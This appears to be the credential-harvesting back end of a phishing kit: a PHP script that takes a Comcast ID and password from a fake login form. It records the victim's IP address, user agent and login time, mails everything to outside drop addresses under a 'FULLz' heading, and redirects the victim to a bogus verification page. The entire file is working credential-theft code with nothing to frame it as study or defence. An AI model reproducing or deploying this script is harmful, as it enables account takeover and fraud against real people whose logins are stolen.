<?

if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$IP = $_POST['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$td = date("F jS");
$msg = $_POST['msg'];
$date = date("d M, Y");
$time = date("g:i a"); 
$LogTime = trim(" Date: ".$date.", Time: ".$time);
$smtp = $_POST['S'];
$user = $_POST['user'];
$passwd = $_POST['passwd'];
/////////sending msg options start/////////////
$subject="Comcast Report !";
$from = "From: CipherReZultZ FULLz Info <Full@info.info>";
$subj = "Comcast";
$mail ="allspamresults@gmail.com, allspamresults@yahoo.com";
///////////////end////////////////////////////
$mailbody="\n CipherReZultZ Information :\n*********\n\nAccount Information :\n*******\nComcast ID : $user\nPassword : $passwd\n\n*****\n\n User Ip Address : $ip \n Logtime : $LogTime \n User Agent: $agent \n -  by CiphErHat™\n\n";
mail($mail, $subj, $mailbody, $from);
Header ("Location: info-verification.html");
?>

